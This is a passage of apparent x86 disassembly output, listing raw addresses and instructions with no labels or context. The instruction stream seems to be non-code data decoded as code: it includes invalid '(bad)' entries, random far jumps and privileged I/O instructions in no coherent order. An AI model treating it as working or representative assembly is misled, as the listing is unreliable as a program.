  449122:	add    ebx,DWORD PTR [esi+edx*4-0x260c4464]
  449129:	pusha  
  44912a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44912b:	mov    edi,0xfe95ac63
  449130:	shr    bh,1
  449132:	out    0x4b,eax
  449134:	sar    BYTE PTR [ebp-0x49],0x1
  449138:	dec    esi
  449139:	mov    ecx,0x61517d29
  44913e:	test   DWORD PTR [ebp+ecx*1+0x7],0xcb343de7
  449146:	out    dx,al
  449147:	push   eax
  449148:	mov    WORD PTR [esi],?
  44914a:	add    ch,BYTE PTR [ebx+0x6cc2fdb7]
  449150:	ins    BYTE PTR es:[edi],dx
  449151:	push   edi
  449152:	lods   al,BYTE PTR ds:[esi]
  449153:	or     DWORD PTR [eax+0x36],esp
  449156:	out    dx,al
  449157:	dec    edx
  449158:	ja     0x44911c
  44915a:	sbb    eax,0xf17d5ea0
  44915f:	or     al,0xd0
  449161:	jno    0x449173
  449163:	mov    ebp,0x9b3960e9
  449168:	mov    ah,0x8d
  44916a:	cwde   
  44916b:	pop    ds
  44916c:	adc    BYTE PTR [ebx+0x33a10aee],bh
  449172:	push   edi
  449173:	jnp    0x449175
  449175:	std    
  449176:	lods   al,BYTE PTR ds:[esi]
  449177:	mov    al,ds:0x962c3829
  44917c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44917d:	mov    bl,0x3c
  44917f:	imul   ebx,DWORD PTR [esi+0x46],0x4e47e7e4
  449186:	out    dx,eax
  449187:	add    DWORD PTR [ecx+ebp*8],ebp
  44918a:	test   DWORD PTR [edi-0x5bc4f973],edi
  449190:	dec    ebp
  449191:	fs jb  0x4491ff
  449194:	mov    es,WORD PTR [ebp+eiz*2-0x11ee1529]
  44919b:	call   0xebe5f33b
  4491a0:	fdivr  DWORD PTR [ebp-0x24]
  4491a3:	mul    BYTE PTR [esi+0x61]
  4491a6:	loopne 0x4491ee
  4491a8:	lds    edi,FWORD PTR [ebp+0x2f75380f]
  4491ae:	out    dx,al
  4491af:	push   ds
  4491b0:	pushf  
  4491b1:	push   0x5060c0d9
  4491b6:	scas   al,BYTE PTR es:[edi]
  4491b7:	mov    al,ds:0x41826a2c
  4491bc:	sbb    BYTE PTR [ebx-0x3fa18158],bh
  4491c2:	fstp   QWORD PTR [edx+0x3f]
  4491c5:	ficom  DWORD PTR [edi-0x44aa9620]
  4491cb:	xchg   ebp,eax
  4491cc:	aam    0x53
  4491ce:	dec    esi
  4491cf:	(bad)  
  4491d0:	hlt    
  4491d1:	popf   
  4491d2:	add    BYTE PTR [eax],cl
  4491d4:	push   0xde312e79
  4491d9:	lahf   
  4491da:	test   eax,0x5e60eedb
  4491df:	sbb    al,0x29
  4491e1:	mov    ebx,DWORD PTR [ebx+ebx*1]
  4491e4:	int3   
  4491e5:	sbb    bh,ah
  4491e7:	aaa    
  4491e8:	mov    dh,0x70
  4491ea:	mov    ds:0x2e48d98d,eax
  4491ef:	popa   
  4491f0:	xlat   BYTE PTR ds:[ebx]
  4491f1:	stc    
  4491f2:	mul    DWORD PTR [eax-0x39aa2e2d]
  4491f8:	or     eax,0x5fbb9bc5
  4491fd:	add    BYTE PTR ss:[edx+edi*4],bh
  449201:	jne    0x4491d3
  449203:	sbb    BYTE PTR [eax+0x56],dl
  449206:	inc    edi
  449207:	mov    eax,ds:0x6fe7e08b
  44920c:	mov    ebp,ds
  44920e:	mov    cl,ch
  449210:	jl     0x4491b1
  449212:	out    0x2e,eax
  449214:	test   eax,0xbef6e87e
  449219:	ret    
  44921a:	mov    cl,0x9f
  44921c:	mov    esi,DWORD PTR [eax-0x31772e71]
  449222:	scas   al,BYTE PTR es:[edi]
  449223:	push   0xbf4ee3db
  449228:	test   al,ah
  44922a:	push   ss
  44922b:	stos   BYTE PTR es:[edi],al
  44922c:	jmp    0x3565:0x8fd51fbb
  449233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449234:	jmp    0x4491d3
  449236:	push   ecx
  449237:	addr16 inc edi
  449239:	loope  0x4491e2
  44923b:	in     eax,0xa9
  44923d:	pusha  
  44923e:	sar    esp,1
  449240:	shl    BYTE PTR [edi+0x56],cl
  449243:	sub    ch,bh
  449245:	or     dh,ch
  449247:	sub    edi,DWORD PTR [ecx+0x64668ded]
  44924d:	add    eax,DWORD PTR [edx]
  44924f:	scas   al,BYTE PTR es:[edi]
  449250:	dec    eax
  449251:	aam    0x6e
  449253:	arpl   WORD PTR [ebx-0x3debd228],ax
  449259:	or     eax,0x599296ee
  44925e:	adc    al,ah
  449260:	dec    ebp
  449261:	int3   
  449262:	mov    ds:0x9a263ea1,eax
  449267:	out    dx,al
  449268:	dec    ebx
  449269:	mov    ah,0x2f
  44926b:	xchg   DWORD PTR [edi+0x11],ebx
  44926e:	outs   dx,BYTE PTR ds:[esi]
  44926f:	mov    dl,BYTE PTR ds:0x9114348e
  449275:	test   al,0x1a
  449277:	lods   al,BYTE PTR ds:[esi]
  449278:	xchg   edx,eax
  449279:	pusha  
  44927a:	push   ebp
  44927b:	hlt    
  44927c:	(bad)  
  44927d:	jmp    0xf9ed:0x566a6e2a
  449284:	jge    0x449252
  449286:	mov    esp,0x1e6a2024
  44928b:	pop    esp
  44928c:	sbb    BYTE PTR [ecx],dl
  44928e:	mov    ebp,DWORD PTR ds:0xb784679b
  449294:	pop    edi
  449295:	lea    edi,[edi-0x30]
  449298:	call   esp
  44929a:	aas    
  44929b:	and    BYTE PTR [esi+0xf],bh
  44929e:	mov    ecx,0xef81e51e
  4492a3:	and    eax,0x615864c3
  4492a8:	out    dx,al
  4492a9:	xchg   esp,esi
  4492ab:	push   esi
  4492ac:	sbb    al,0x31
  4492ae:	mov    ds:0xbd5f56f4,eax
  4492b3:	hlt    
  4492b4:	mov    ebp,0x9e7fe8a7
  4492b9:	mov    WORD PTR [ebx+0x162c5ee9],ds
  4492bf:	jg     0x449252
  4492c1:	jle    0x4492d4
  4492c3:	dec    esp
  4492c4:	push   ecx
  4492c5:	popa   
  4492c6:	fisttp WORD PTR [esi+0x1273298f]
  4492cc:	push   ds
  4492cd:	and    eax,0x515e1ce5
  4492d2:	lods   al,BYTE PTR ds:[esi]
  4492d3:	xchg   ebp,eax
  4492d4:	xor    ebp,eax
  4492d6:	xchg   esi,eax
  4492d7:	jno    0x4492ee
  4492d9:	pusha  
  4492da:	sub    al,0x1e
  4492dc:	lea    esp,[eax+0x721a169d]
  4492e2:	mov    ?,WORD PTR ds:0x4abe6084
  4492e8:	inc    esp
  4492e9:	cld    
  4492ea:	(bad)  
  4492eb:	mov    edx,0xedee220c
  4492f0:	popw   ds
  4492f2:	in     eax,0x86
  4492f4:	push   ss
  4492f5:	out    dx,eax
  4492f6:	ret    0x238f
  4492f9:	xchg   ebp,eax
  4492fa:	push   edi
  4492fb:	popa   
  4492fc:	dec    ecx
  4492fd:	jle    0x4492d4
  4492ff:	in     eax,0x6a
  449301:	xchg   esi,eax
  449302:	mov    ah,0x97
  449304:	jb     0x44936e
  449306:	test   DWORD PTR [ebx],0xcc0660b1
  44930c:	fwait
  44930d:	inc    edx
  44930e:	jp     0x4492d1
  449310:	xor    al,BYTE PTR [ecx]
  449312:	retf   0x506c
  449315:	(bad)  
  449316:	fsubr  DWORD PTR [eax+0x54]
  449319:	pop    ebp
  44931a:	out    dx,al
  44931b:	dec    edi
  44931c:	pop    edi
  44931d:	cmp    edi,DWORD PTR [eax+ebp*1-0x1cbb9f83]
  449324:	ins    BYTE PTR es:[edi],dx
  449325:	popa   
  449326:	cmp    al,0x76
  449328:	xchg   ecx,eax
  449329:	inc    ebx
  44932a:	out    dx,al
  44932b:	and    eax,0x99ab88e3
  449330:	xor    al,BYTE PTR [ecx+eiz*4]
  449333:	jno    0x449371
  449335:	popa   
  449336:	sbb    eax,0xa5e5ed8b
  44933b:	mov    ds:0x26ee7ddd,al
  449340:	or     eax,0xb46b37d
  449345:	ins    BYTE PTR es:[edi],dx
  449346:	sahf   
  449347:	mov    eax,ds:0x5785ff76
  44934c:	push   ebp
  44934d:	mov    al,0xc1
  44934f:	push   ebp
  449350:	pop    esi
  449351:	cmp    al,0x8f
  449353:	in     al,0x86
  449355:	mov    WORD PTR [ecx-0x75aae666],fs
  44935b:	lock mov ch,0x95
  44935e:	push   edx
  44935f:	ficomp WORD PTR [ebx-0xd]
  449362:	push   ds
  449363:	das    
  449364:	push   ebx
  449365:	xchg   edx,eax
  449366:	into   
  449367:	xchg   ecx,eax
  449368:	dec    edi
  449369:	inc    ecx
  44936a:	inc    ebp
  44936b:	mov    eax,ds:0x8ba1e1ec
  449370:	cmp    DWORD PTR [edx-0x56a18729],esp
  449376:	inc    ecx
  449377:	ins    BYTE PTR es:[edi],dx
  449378:	add    al,0x81
  44937a:	mov    bl,0xe
  44937c:	pop    ss
  44937d:	popa   
  44937e:	mov    bh,0xeb
  449380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449381:	push   ecx
  449382:	and    esi,DWORD PTR [edi-0x201125ad]
  449388:	sub    edx,0xffffffb1
  44938b:	fisubr WORD PTR [ebx]
  44938d:	jnp    0x449326
  44938f:	test   al,0x41
  449391:	nop    DWORD PTR [esi+0x6f4a80a2]
  449398:	add    eax,0xae33522d
  44939d:	enter  0xfed,0xe0
  4493a1:	and    DWORD PTR [eax+ecx*8+0x56],esi
  4493a5:	push   0x7bddad6e
  4493aa:	jle    0x4493fb
  4493ac:	mov    esp,0x4d61e749
  4493b1:	jb     0x4493d1
  4493b3:	cmp    DWORD PTR [esi+0x1e95a758],ecx
  4493b9:	pop    esi
  4493ba:	add    DWORD PTR [edx+0x699f1c7],eax
  4493c0:	pop    esi
  4493c1:	add    eax,0x4e02c315
  4493c6:	idiv   DWORD PTR [edi-0x15]
  4493c9:	pop    ebx
  4493ca:	scas   eax,DWORD PTR es:[edi]
  4493cb:	mov    ?,WORD PTR [edx+edi*8-0x2c]
  4493cf:	and    eax,0x7f566129
  4493d4:	out    0x74,al
  4493d6:	dec    ebx
  4493d7:	cmp    eax,DWORD PTR [ecx+ebp*2-0x6f]
  4493db:	frstor [ebx-0x78]
  4493de:	pusha  
  4493df:	mov    eax,ds:0x5d0798e7
  4493e4:	push   0x221b5a5a
  4493e9:	ins    BYTE PTR es:[edi],dx
  4493ea:	mov    esp,0xc0db6d90
  4493ef:	inc    edx
  4493f0:	pop    esi
  4493f1:	dec    edx
  4493f2:	(bad)  
  4493f4:	mov    bh,0x5f
  4493f6:	cs mov bl,ah
  4493f9:	push   0x57def812
  4493fe:	retf   0x746f
  449401:	jo     0x44947c
  449403:	sahf   
  449404:	pop    esi
  449405:	or     BYTE PTR [esi+0x6e],ch
  449408:	sbb    bh,BYTE PTR [ecx-0x50b55d25]
  44940e:	xor    eax,0x299352da
  449414:	bound  ecx,QWORD PTR [ecx+0x4966a1ae]
  44941a:	rcl    DWORD PTR [ebx-0x6cd4cea2],1
  449420:	ss mov ss,esp
  449423:	clc    
  449424:	shl    BYTE PTR [eax-0x37],1
  449427:	mov    ecx,0x19cca0fc
  44942c:	jge    0x449428
  44942e:	out    dx,al
  44942f:	(bad)  
  449430:	push   ecx
  449431:	xor    esp,esi
  449433:	ret    0x239c
  449436:	jge    0x4493e2
  449438:	repz inc ecx
  44943a:	outs   dx,BYTE PTR ds:[esi]
  44943b:	push   edx
  44943c:	into   
  44943d:	jo     0x4493da
  44943f:	jmp    0x4493c8
  449441:	add    al,0xee
  449443:	pop    esi
  449444:	mov    ch,bh
  449446:	sub    al,0x74
  449448:	pushf  
  449449:	imul   eax,DWORD PTR [eax],0x8a2d33a1
  44944f:	fimul  WORD PTR [eax]
  449451:	xchg   DWORD PTR [ecx],ebx
  449453:	pop    ecx
  449454:	adc    al,0xee
  449457:	or     DWORD PTR [ebx+0x769a7a75],ebp
  44945d:	add    al,0xd2
  44945f:	mov    al,ds:0xad677ac1
  449464:	cli    
  449465:	pop    edi
  449466:	mov    al,ds:0x4e2b5e83
  44946b:	or     eax,0x3613dc4a
  449470:	ret    0x9160
  449473:	sub    eax,0x133c3188
  449478:	stos   DWORD PTR es:[edi],eax
  449479:	ins    BYTE PTR es:[edi],dx
  44947a:	jmp    0x4494bc
  44947c:	test   BYTE PTR [ecx],bh
  44947e:	mov    al,ds:0x1cf14ae7
  449483:	rol    ebx,1
  449485:	pusha  
  449486:	outs   dx,DWORD PTR ds:[esi]
  449487:	fbld   TBYTE PTR [ecx]
  449489:	in     al,0xb7
  44948b:	sti    
  44948c:	mov    bl,BYTE PTR [esi]
  44948e:	out    dx,al
  44948f:	push   0xf9bd3318
  449494:	adc    DWORD PTR [ebx+eax*8-0x60],esp
  449498:	pusha  
  449499:	neg    ch
  44949b:	pusha  
  44949c:	adc    al,0x3d
  44949e:	stc    
  44949f:	sbb    DWORD PTR [edi+0x75],0x1112d901
  4494a6:	mov    esp,0x49c27560
  4494ab:	xchg   DWORD PTR [edx],esp
  4494ad:	popa   
  4494ae:	in     al,0xda
  4494b0:	cmp    eax,0x2e2cc457
  4494b5:	stos   BYTE PTR es:[edi],al
  4494b6:	out    dx,al
  4494b7:	(bad)  
  4494b9:	pushf  
  4494ba:	mov    esi,0x9224c8a3
  4494bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4494c0:	jmp    0xc7437c7b
  4494c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4494c6:	outs   dx,BYTE PTR ds:[esi]
  4494c7:	fdivr  QWORD PTR [ebx]
  4494c9:	(bad)  
  4494ca:	out    dx,al
  4494cb:	mov    ch,0x82
  4494cd:	imul   ebp,DWORD PTR [ecx+0x37],0xa104ea3e
  4494d4:	addr16 jnp 0x44946d
  4494d7:	jmp    0xd9ad8113
  4494dc:	push   ebx
  4494dd:	push   esp
  4494de:	scas   al,BYTE PTR es:[edi]
  4494df:	or     bl,dh
  4494e1:	add    BYTE PTR [ebx],0x1c
  4494e4:	stos   BYTE PTR es:[edi],al
  4494e5:	or     dl,bl
  4494e7:	mov    al,ds:0xff79c912
  4494ec:	aad    0xfd
  4494ee:	sbb    BYTE PTR ds:0x7400065e,0x44
  4494f5:	test   al,0x1d
  4494f7:	cld    
  4494f8:	fistp  WORD PTR [edi+0x33]
  4494fb:	sub    al,0x22
  4494fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4494fe:	into   
  4494ff:	jns    0x44948d
  449501:	jo     0x44954e
  449503:	lock jp 0x4494b4
  449506:	jle    0x44952c
  449508:	pusha  
  449509:	adc    edi,DWORD PTR [edi+0x57872ba5]
  44950f:	cmp    DWORD PTR [edi-0x22],0x60be792c
  449516:	cmp    esi,esi
  449518:	emms   
  44951a:	or     BYTE PTR [ebx-0x32],bh
  44951d:	adc    esi,ebp
  44951f:	inc    ecx
  449520:	rol    ah,1
  449522:	int    0xef
  449524:	shr    DWORD PTR [edx],cl
  449526:	retf   
  449527:	mov    al,ds:0x9047b199
  44952c:	sti    
  44952d:	add    BYTE PTR [ecx],bh
  44952f:	lods   eax,DWORD PTR ds:[esi]
  449530:	scas   al,BYTE PTR es:[edi]
  449531:	stc    
  449532:	out    dx,al
  449533:	lock pop ebp
  449535:	inc    eax
  449536:	push   ecx
  449537:	dec    edx
  449538:	aas    
  449539:	repnz inc esi
  44953b:	mov    eax,ds:0xe78306d5
  449540:	test   eax,0x5e6e7998
  449545:	push   ecx
  449547:	xor    esi,DWORD PTR [edx+0x5d]
  44954a:	xchg   edx,eax
  44954b:	dec    esi
  44954c:	jne    0x4495ad
  44954e:	fdecstp 
  449550:	out    dx,eax
  449551:	mov    ebp,0x88cde19e
  449556:	(bad)  
  449557:	push   edi
  449558:	pop    esi
  449559:	inc    ebp
  44955a:	data16 aaa 
  44955c:	push   ecx
  44955d:	xor    ebx,DWORD PTR [ebx]
  44955f:	adc    ah,cl
  449561:	or     BYTE PTR [edi+ecx*1+0x5e],al
  449565:	out    0xfc,al
  449567:	arpl   WORD PTR [edx],dx
  449569:	inc    esi
  44956a:	mov    al,0x7d
  44956c:	pop    esi
  44956d:	aaa    
  44956e:	mov    esp,0xb77f9d6e
  449573:	push   ecx
  449574:	(bad)  
  449575:	pusha  
  449576:	aas    
  449577:	adc    eax,0x484be5f3
  44957c:	sti    
  44957d:	shl    DWORD PTR [esi],cl
  44957f:	cmp    DWORD PTR [edi-0x4a5f459a],esp
  449585:	gs jb  0x449567
  449588:	xchg   ebx,eax
  449589:	pop    es
  44958a:	mov    ebp,0xa2314897
  44958f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449590:	repz jnp 0x449606
  449593:	retf   
  449594:	mov    ss,WORD PTR [esi]
  449596:	std    
  449597:	sbb    bl,BYTE PTR [esi+0x76]
  44959a:	mov    cl,0xeb
  44959c:	mov    edx,0x9dd38def
  4495a1:	pusha  
  4495a2:	retf   0xfe2d
  4495a5:	shl    BYTE PTR [edi],0x7b
  4495a8:	hlt    
  4495a9:	pop    esp
  4495aa:	out    dx,al
  4495ab:	mov    ebp,0xe6592449
  4495b0:	stc    
  4495b1:	ror    DWORD PTR [edx-0x5f],1
  4495b4:	pop    ds
  4495b5:	icebp  
  4495b6:	xchg   ebp,eax
  4495b7:	popa   
  4495b8:	mov    al,ds:0x5efac6c6
  4495bd:	push   edx
  4495be:	push   ds
  4495bf:	clc    
  4495c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4495c1:	sbb    al,0x4c
  4495c3:	sahf   
  4495c4:	jae    0x44960f
  4495c6:	mov    esp,0x1561392f
  4495cb:	imul   edi,ebx,0x51dba24e
  4495d1:	inc    edi
  4495d2:	mov    bl,0x9f
  4495d4:	sub    eax,0x3efd082f
  4495d9:	out    dx,eax
  4495da:	mov    eax,ds:0xf36135f6
  4495df:	ror    BYTE PTR [ecx-0x43fc0310],cl
  4495e5:	mov    al,0xee
  4495e7:	hlt    
  4495e8:	xchg   ebx,eax
  4495e9:	ret    0xf773
  4495ec:	xor    DWORD PTR [ebx],esp
  4495ee:	arpl   WORD PTR [ecx-0x507e7966],sp
  4495f4:	push   eax
  4495f5:	iret   
  4495f6:	xor    al,0xdf
  4495f8:	aaa    
  4495f9:	jge    0x44965f
  4495fb:	outs   dx,BYTE PTR ds:[esi]
  4495fc:	pop    esi
  4495fd:	xor    BYTE PTR es:[ecx],al
  449600:	frstor [eax]
  449602:	aaa    
  449603:	inc    eax
  449604:	imul   ebx,DWORD PTR [edi+0x0],0xf1ee00f5
  44960b:	imul   eax,DWORD PTR [ebx],0x20
  44960e:	mov    bl,BYTE PTR [ebx]
  449610:	jp     0x4495ca
  449612:	pop    edx
  449613:	cdq    
  449614:	pop    esi
  449615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449616:	inc    BYTE PTR [ecx-0xce99fef]
  44961c:	mov    ch,0x60
  44961e:	mov    BYTE PTR [ebp-0x78],ah
  449621:	xchg   edx,eax
  449622:	jo     0x4495c1
  449624:	popf   
  449625:	(bad)  
  449626:	out    dx,al
  449627:	mov    esp,0xdaeb4d10
  44962c:	loop   0x449608
  44962e:	push   ds
  44962f:	scas   eax,DWORD PTR es:[edi]
  449630:	mov    ebp,0x5436ee40
  449635:	sbb    ah,BYTE PTR [edx+0x78]
  449638:	xor    BYTE PTR [ebx-0x12],ah
  44963b:	push   eax
  44963c:	int    0xe2
  44963e:	xchg   edi,eax
  44963f:	jmp    0x9a78ae31
  449644:	cli    
  449645:	in     eax,dx
  449646:	scas   al,BYTE PTR es:[edi]
  449647:	jl     0x44962d
  449649:	psllq  mm1,mm0
  44964c:	push   0xf9a15f00
  449651:	pop    ebx
  449652:	mov    esi,0xeb858941
  449657:	and    ch,bh
  449659:	xor    DWORD PTR [ebx-0x1e5f8d49],0xf5609c35
  449663:	mov    dl,0x3
  449665:	aas    
  449666:	xchg   DWORD PTR [ecx+0x3e],esi
  449669:	sub    al,0xd9
  44966b:	sti    
  44966c:	pop    edi
  44966d:	push   esp
  44966e:	clc    
  44966f:	push   0xffffffa2
  449671:	adc    al,0xa1
  449673:	and    DWORD PTR [edi+0x6f],ebp
  449676:	or     ah,BYTE PTR [ecx-0x2512fd2f]
  44967c:	pushf  
  44967d:	and    DWORD PTR [ecx],eax
  44967f:	test   DWORD PTR [ebx-0x42],esp
  449682:	jmp    0xe6a52dd4
  449687:	jp     0x449653
  449689:	mov    dl,dl
  44968b:	mov    al,ds:0xeca3e49e
  449690:	bound  edx,QWORD PTR [edi]
  449692:	test   al,0xb7
  449694:	cmp    al,ah
  449696:	pop    es
  449697:	and    BYTE PTR [ebp+ebp*4-0x7d],bl
  44969b:	and    DWORD PTR [edi+0x6f],ecx
  44969e:	add    al,0xf
  4496a0:	mov    edx,0xf12e8142
  4496a5:	pusha  
  4496a6:	aas    
  4496a7:	lods   eax,DWORD PTR ds:[esi]
  4496a8:	ja     0x4496b4
  4496aa:	cmp    ebp,DWORD PTR [eax]
  4496ac:	pop    esi
  4496ad:	lea    ecx,[ebp-0x3d]
  4496b0:	add    al,0x13
  4496b2:	nop
  4496b3:	jp     0x4496f6
  4496b5:	popa   
  4496b6:	xor    ecx,esi
  4496b8:	cmp    BYTE PTR [edx+0x4593b17b],dh
  4496be:	fsubrp st(1),st
  4496c0:	push   cs
  4496c1:	pop    esi
  4496c2:	jp     0x4496d5
  4496c4:	pop    esi
  4496c5:	mov    ecx,0x18621cfe
  4496ca:	fld    DWORD PTR [ecx+0x6c]
  4496cd:	pusha  
  4496ce:	and    cl,BYTE PTR [edi-0x46736f0d]
  4496d4:	jmp    0xe08e:0x4b24e731
  4496db:	inc    esp
  4496dc:	mov    edi,0x34a19bd6
  4496e1:	out    0xfc,eax
  4496e3:	(bad)  
  4496e4:	loop   0x449753
  4496e6:	cdq    
  4496e7:	sbb    BYTE PTR [esi-0x3e],0x4b
  4496eb:	jae    0x4496b7
  4496ed:	sub    al,0xc3
  4496ef:	call   0x329bf831
  4496f4:	mov    ch,0x17
  4496f6:	int    0x78
  4496f8:	arpl   WORD PTR [eax-0x12],si
  4496fb:	in     al,dx
  4496fc:	mov    ebx,0x8b1e8bb5
  449701:	inc    ecx
  449702:	inc    ebx
  449703:	mov    eax,ds:0xb422d933
  449708:	inc    ebx
  449709:	(bad)  
  44970b:	fsub   QWORD PTR [ebx+0x7c]
  44970e:	inc    edx
  44970f:	adc    dl,BYTE PTR [eax-0xdb53c0]
  449715:	call   0x9c7e:0xb1fa0e8
  44971c:	sbb    DWORD PTR [ecx*1-0x1bc5a1e9],esi
  449723:	mov    ds:0xbafa78c3,al
  449728:	fs popa 
  44972a:	and    BYTE PTR [ecx],dh
  44972c:	aam    0xa7
  44972e:	aad    0x3a
  449730:	int    0x13
  449732:	clc    
  449733:	cmp    eax,0x70ee951d
  449738:	daa    
  449739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44973a:	or     eax,DWORD PTR [ecx+ebx*8]
  44973d:	push   ecx
  44973e:	lock sub BYTE PTR [ebx],0x55
  449742:	outs   dx,BYTE PTR ds:[esi]
  449743:	mov    ecx,0x610a809f
  449748:	pop    esi
  449749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44974a:	jno    0x449712
  44974c:	xor    DWORD PTR [edx+0x60e48d91],edx
  449752:	push   ds
  449753:	lock leave 
  449755:	jmp    0x55014151
  44975a:	and    cl,dl
  44975c:	pop    ds
  44975d:	loope  0x449767
  44975f:	push   esp
  449760:	mov    al,0x48
  449762:	cmp    al,0x71
  449764:	and    al,0x61
  449766:	sub    DWORD PTR [eax-0x31],esp
  449769:	aam    0x55
  44976b:	rcr    esi,0xc0
  44976e:	out    dx,al
  44976f:	ja     0x449726
  449771:	adc    BYTE PTR [ebp+0x5018848],dl
  449777:	mov    eax,ds:0x5ac6e021
  44977c:	mov    al,ds:0x5e0d30f8
  449781:	xchg   edx,eax
  449782:	push   ebp
  449783:	loope  0x449764
  449785:	inc    ecx
  449786:	in     al,0x4a
  449788:	jl     0x4497ec
  44978a:	xor    eax,0x12aa3453
  44978f:	push   0x64
  449791:	push   ebx
  449792:	fst    QWORD PTR [ebx+edx*4+0x1]
  449796:	mov    ah,BYTE PTR [ecx+0x6381b50d]
  44979c:	enter  0x502d,0x73
  4497a0:	jo     0x449801
  4497a2:	out    dx,al
  4497a3:	jp     0xb6f49292
  4497a9:	addr16 mov ebx,0xeb5abcad
  4497af:	cmp    bl,dh
  4497b1:	sbb    BYTE PTR ds:0xe6207d03,bl
  4497b7:	push   edi
  4497b8:	jbe    0x449746
  4497ba:	ja     0x44974b
  4497bc:	pop    esi
  4497bd:	jb     0x449827
  4497bf:	xchg   cl,dh
  4497c1:	push   eax
  4497c2:	or     BYTE PTR [ebp-0x69],bl
  4497c5:	pusha  
  4497c6:	mul    DWORD PTR [edx-0x6d]
  4497c9:	mov    ds:0x984a9bdf,al
  4497ce:	cld    
  4497cf:	adc    ebx,DWORD PTR [ecx+0x10]
  4497d2:	(bad)  
  4497d3:	cmp    eax,0x47b6571d
  4497d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4497d9:	add    ah,BYTE PTR [ebp-0x3d]
  4497dc:	xchg   esi,eax
  4497dd:	popf   
  4497de:	mov    cl,0xa0
  4497e0:	mov    edx,0x44b9a145
  4497e5:	cmp    eax,0x865fa250
  4497ea:	mov    ebp,0x113f655b
  4497ef:	and    DWORD PTR [eax],esi
  4497f1:	push   eax
  4497f2:	ja     0x449793
  4497f4:	pop    ebx
  4497f5:	in     al,0x64
  4497f7:	ins    DWORD PTR es:[edi],dx
  4497f8:	pop    esi
  4497f9:	sahf   
  4497fa:	mov    ch,0x50
  4497fc:	inc    edi
  4497fd:	cmp    BYTE PTR [edi],cl
  4497ff:	or     cl,bh
  449801:	or     ah,BYTE PTR [edx-0x2730f15f]
  449807:	(bad)  
  449808:	loop   0x4497d3
  44980a:	pop    eax
  44980b:	push   ss
  44980c:	push   ecx
  44980d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44980e:	daa    
  44980f:	add    bl,BYTE PTR [esi-0x48]
  449812:	stos   DWORD PTR es:[edi],eax
  449813:	and    edi,DWORD PTR [ebx-0x63]
  449816:	cmp    al,0xa2
  449818:	int3   
  449819:	dec    ebp
  44981a:	std    
  44981b:	idiv   DWORD PTR [edi+0x7e023f8c]
  449821:	or     DWORD PTR [eax-0x113a1f3f],0xffffffbb
  449828:	adc    DWORD PTR [edx+0x3c612a73],esp
  44982e:	mov    al,ds:0x202c30a6
  449833:	rol    BYTE PTR [esi-0x1f],0xd4
  449837:	fistp  WORD PTR [edx]
  449839:	ja     0x449829
  44983b:	sbb    al,0x15
  44983d:	mov    ah,0xb4
  44983f:	mov    DWORD PTR [ebp+0x23],esp
  449842:	push   ebp
  449843:	mov    eax,ds:0xa06fdd93
  449848:	rol    DWORD PTR [ebx-0x10],cl
  44984b:	in     eax,dx
  44984c:	pop    esi
  44984d:	mov    esi,ebx
  44984f:	sbb    DWORD PTR [edx-0x6f],ebx
  449852:	fild   DWORD PTR [eax-0xb]
  449855:	add    al,0xa9
  449857:	mov    ah,0x5b
  449859:	push   eax
  44985a:	jecxz  0x4498b8
  44985c:	out    0xe0,eax
  44985e:	and    ebp,DWORD PTR [edi+0x1d010d9d]
  449864:	shr    DWORD PTR es:[esi],0xfd
  449868:	les    ecx,FWORD PTR [edi+0x59f34be1]
  44986e:	imul   esi,DWORD PTR [esi],0x20d4fd12
  449874:	sahf   
  449875:	sub    edi,DWORD PTR [ecx]
  449877:	inc    eax
  449878:	fs icebp 
  44987a:	prefetch BYTE PTR [ecx]
  44987d:	sbb    DWORD PTR [edx-0x57],0xa0cd3caf
  449884:	adc    DWORD PTR [ebp-0x2729bbd6],eax
  44988a:	jg     0x449815
  44988c:	pop    esi
  44988d:	add    DWORD PTR [esi+eax*8+0x4711ecd2],eax
  449894:	leave  
  449895:	push   edx
  449896:	test   eax,0x4e1cc0ba
  44989b:	xchg   esp,eax
  44989c:	or     eax,0x536fe360
  4498a1:	rcr    DWORD PTR [esi],0xce
  4498a4:	mov    eax,0xa13792dd
  4498a9:	ins    BYTE PTR es:[edi],dx
  4498aa:	imul   si,WORD PTR [eax+eiz*1+0x60c78d05],0xffc4
  4498b3:	pop    es
  4498b4:	test   eax,0x9f47bd7
  4498b9:	gs (bad) 
  4498bb:	mov    ecx,0x9fee756a
  4498c0:	stc    
  4498c1:	enter  0x448f,0x8d
  4498c5:	pusha  
  4498c6:	lods   eax,DWORD PTR ds:[esi]
  4498c7:	enter  0x7e0b,0x60
  4498cb:	hlt    
  4498cc:	fist   WORD PTR [eax-0x20]
  4498cf:	divps  xmm7,xmm0
  4498d2:	push   esp
  4498d3:	ja     0x449864
  4498d5:	push   esi
  4498d6:	cdq    
  4498d7:	sbb    eax,ebx
  4498d9:	pusha  
  4498da:	mov    cl,0x8f
  4498dc:	cs test eax,0x1d64810e
  4498e2:	out    dx,al
  4498e3:	lahf   
  4498e4:	shl    DWORD PTR [ecx-0x17217e24],1
  4498ea:	daa    
  4498eb:	mov    eax,ds:0xd332f6a4
  4498f0:	mov    al,ds:0x5e3f1995
  4498f5:	retf   0x89f8
  4498f8:	(bad)  
  4498f9:	jmp    0x60df646e
  4498fe:	fist   DWORD PTR [edi-0x3e809614]
  449904:	lea    ebp,[eax-0x12]
  449907:	cwde   
  449908:	ins    BYTE PTR es:[edi],dx
  449909:	add    BYTE PTR [edi+esi*4-0x7e],bh
  44990d:	xor    dl,cl
  44990f:	mov    al,ds:0x71307586
  449914:	repnz ror BYTE PTR [edi],1
  449917:	lock pop esi
  449919:	ins    DWORD PTR es:[edi],dx
  44991a:	scas   al,BYTE PTR es:[edi]
